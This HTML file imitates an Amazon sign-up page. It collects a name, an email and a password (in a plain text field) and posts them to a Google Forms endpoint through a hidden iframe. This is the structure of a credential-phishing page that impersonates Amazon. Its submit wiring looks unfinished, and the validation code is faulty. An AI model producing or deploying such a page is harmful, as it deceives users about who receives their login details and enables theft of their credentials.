<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Trial</title>

    <link rel="stylesheet" href="signinstyle.css" />
  </head>

  <body>
    <div style="margin-top: 100px">
      <div class="parent">
        <div class="name">
          <a class="setc" href="new.html"> amazon.in</a>
        </div>
      </div>
      <div class="parent2">
        <div class="child1"></div>
        <div class="child2">
          <div>Sign-up</div>
          <div class="email">
            <div>Name</div>
          </div>
          <form
            action="https://docs.google.com/forms/u/0/d/e/1FAIpQLScIWfljDJCVJ7OaA_YdNxWbuHepecWuax7wbFFHpOxU5eF4eA/formResponse"
            method="post"
            target="hidden_iframe"
            onsubmit="submitted=true"
          >
            <input
              class="input"
              type="text"
              name="entry.2045028356"
              id="uname"
            />
            <p class="btn11" id="usererror"></p>
            <div class="email">
              <div>Email id</div>
            </div>
            <input
              class="input"
              type="text"
              name="entry.712906628"
              id="email"
            />
            <p class="btn11" id="usererror2"></p>
            <div class="email">
              <div>Password</div>
            </div>
            <input class="input" type="text" name="entry.919925057" id="pass" />
            <p class="btn11" id="usererror3"></p>

            <input
              class="btn"
              type="Button"
              value="continue"
              onclick="validateform()"
            />
          </form>
          <div>
            <div class="disc">
              <div class="inst">By continuing, you agree to Amazon's</div>

              <div class="condition">
                <a class="tnc" href="">Conditions of Use</a>
              </div>
            </div>
          </div>
        </div>
        <div class="child3"></div>
      </div>
    </div>
    <script type="text/javascript">
      var submitted = false;
    </script>
    <iframe
      name="hidden_iframe"
      id="hidden_iframe"
      style="display: none"
      onload="if(submitted){ }"
    ></iframe>
    <script>
      let username = document.getElementById("uname");
      let email1 = document.getElementById("email");
      let pass1 = document.getElementById("pass");
      let flag = 1;

      function validateform() {
        if (username.value == "") {
          document.getElementById("usererror").innerHTML =
            "*please enter your name";
          flag = 0;
        } else {
          document.getElementById("usererror").innerHTML = "";
          flag = 1;
        }

        if (email1.value == "") {
          document.getElementById("usererror2").innerHTML =
            "*please enter your email";
          flag = 0;
        } else {
          document.getElementById("usererror2").innerHTML = "";
          flag = 1;
        }
        if (pass1.value == "") {
          document.getElementById("usererror3").innerHTML =
            "*please enter your password";
          flag = 0;
        } else {
          document.getElementById("usererror3").innerHTML = "";
          flag = 1;
        }
        if (flag) {
          return true;
        } else {
          return false;
        }
      }
    </script>
  </body>
</html>
